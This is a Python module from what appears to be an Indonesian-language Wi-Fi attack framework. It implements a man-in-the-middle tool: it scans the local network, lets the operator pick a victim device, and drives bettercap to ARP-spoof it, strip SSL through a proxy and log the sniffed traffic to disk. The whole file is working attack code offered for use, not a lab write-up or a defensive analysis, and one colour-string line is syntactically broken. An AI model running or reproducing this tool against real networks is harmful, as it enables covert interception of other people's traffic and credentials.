import os
import sys
import time
import subprocess
import nmap
import re
from pathlib import Path
from scapy.all import ARP, Ether, srp, conf

# Import setting dari config
try:
    from wifipro.core.config import TIMER_SNIFFING, CURRENT_IFACE, MITM_LOG_PATH
except ImportError:
    TIMER_SNIFFING = 60 # Kita naikin dikit biar puas
    CURRENT_IFACE = "wlan0"
    MITM_LOG_PATH = "data/mitm/logs"

class PhantomMitmUltimate:
    def __init__(self, wifi_engine=None, colors=None):
        # Integrasi dengan framework utama
        self.wifi = wifi_engine
        self.interface = getattr(wifi_engine, 'iface', CURRENT_IFACE)
        self.nm = nmap.PortScanner()
        
        # Gunakan warna dari menu atau fallback
        if colors:
            self.c = colors
        else:
            class Colors:
                G, Y, R, C, W, B, OK, ERR, Q, NC = '\033[92m', '\033[93m', '\033[91m', '\033[96m', '\033[0m', '\033[94m', '\033[92m', '\033[91m', '\033[94m', '\033[0m
            self.c = Colors()

    def scan_network(self):
        c = self.c
        try:
            # Ambil gateway otomatis
            gateway_ip = conf.route.route("0.0.0.0")[2]
            prefix = ".".join(gateway_ip.split('.')[:-1]) + ".0/24"
        except:
            print(f"{c.R}[!] Gagal prefix IP. Cek koneksi!{c.W}")
            return []

        print(f"\n{c.Y}[*] Scanning Network: {c.W}{prefix}...")
        
        try:
            # ARP Scan Cepat
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=prefix), timeout=2, verbose=False)
            active_ips = [r[ARP].psrc for s, r in ans if r[ARP].psrc != gateway_ip]
            
            if not active_ips:
                print(f"{c.R}[!] No devices found.{c.W}")
                return []

            print(f"{c.G}[*] Identifying {len(active_ips)} devices via Nmap...{c.W}")
            self.nm.scan(hosts=" ".join(active_ips), arguments='-sn -T4')
            
            targets = []
            print(f"\n{c.B}ID  IP ADDRESS       MAC ADDRESS        DEVICE NAME{c.W}")
            print(f"{c.B}--- ------------     -----------------  -----------------------{c.W}")

            for i, ip in enumerate(active_ips):
                host_info = self.nm[ip] if ip in self.nm.all_hosts() else {}
                mac = host_info.get('addresses', {}).get('mac', 'Unknown')
                vendor = host_info.get('vendor', {}).get(mac, 'Unknown Vendor')
                name = host_info.hostname() if host_info.get('hostnames') else vendor

                targets.append({'ip': ip, 'mac': mac, 'name': name})
                print(f"[{c.G}{i:02d}{c.W}] {ip:15}  {mac}  {c.C}{name[:20]}{c.W}")
            
            return targets
        except Exception as e:
            print(f"{c.R}[-] Scan Error: {e}{c.W}")
            return []

    def run(self, targets=None):
        c = self.c
        if not targets:
            targets = self.scan_network()
            if not targets: return

        # 1. Pilih Target
        try:
            val = input(f"\n{c.Q} Pilih ID Target untuk MITM: {c.W}").strip()
            target = targets[int(val)]
        except: return

        # 2. Persiapan Folder & File
        log_dir = Path(MITM_LOG_PATH)
        log_dir.mkdir(parents=True, exist_ok=True)
        caplet_path = "phantom.cap"
        temp_log = "sniffed_data.log"

        # 3. Create Bettercap Caplet (Full Mode)
        with open(caplet_path, "w") as f:
            f.write(f"set net.sniff.verbose false\n")
            f.write(f"set net.sniff.output {temp_log}\n")
            f.write(f"set arp.spoof.targets {target['ip']}\n")
            f.write(f"set arp.spoof.fullduplex true\n")
            # Skill Tambahan: SSL Strip & Proxy
            f.write(f"set http.proxy.sslstrip true\n")
            f.write(f"arp.spoof on\n")
            f.write(f"http.proxy on\n")
            f.write(f"net.sniff on\n")

        # 4. Aktifkan IP Forwarding
        os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null")

        # 5. Launch Bettercap
        print(f"\n{c.G}[+] MITM AKTIF: {c.Y}{target['ip']} ({target['name']}){c.NC}")
        proc = subprocess.Popen(
            ["sudo", "bettercap", "-iface", self.interface, "-caplet", caplet_path],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

        try:
            start_time = time.time()
            while time.time() - start_time < TIMER_SNIFFING:
                remaining = int(TIMER_SNIFFING - (time.time() - start_time))
                # Hitung baris data
                count = 0
                if os.path.exists(temp_log):
                    with open(temp_log, "rb") as f:
                        count = sum(1 for _ in f)
                
                sys.stdout.write(f"\r{c.W}Intercepting... {c.R}{remaining:02d}s {c.W}| Data Captured: {c.Y}{count} lines{c.W}")
                sys.stdout.flush()
                time.sleep(1)
            
            print(f"\n\n{c.G}[+] Sniffing Session Completed.{c.W}")
            
        except KeyboardInterrupt:
            print(f"\n\n{c.R}[!] Aborted by user.{c.W}")
        finally:
            proc.terminate()
            proc.wait()
            self.cleanup(target['ip'], caplet_path, temp_log)

    def cleanup(self, target_ip, caplet, temp_log):
        c = self.c
        os.system("sudo pkill bettercap > /dev/null 2>&1")
        if os.path.exists(caplet): os.remove(caplet)
        
        if os.path.exists(temp_log):
            clean_ip = target_ip.replace('.', '_')
            final_log = Path(MITM_LOG_PATH) / f"{clean_ip}_sniff.txt"
            
            # Pindahin log
            os.system(f"cat {temp_log} >> {final_log}")
            os.remove(temp_log)
            print(f"{c.G}[+] Data saved to: {c.C}{final_log}{c.W}")
        
        os.system("sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null")
        print(f"{c.Y}[*] System cleaned and IP Forwarding disabled.{c.W}")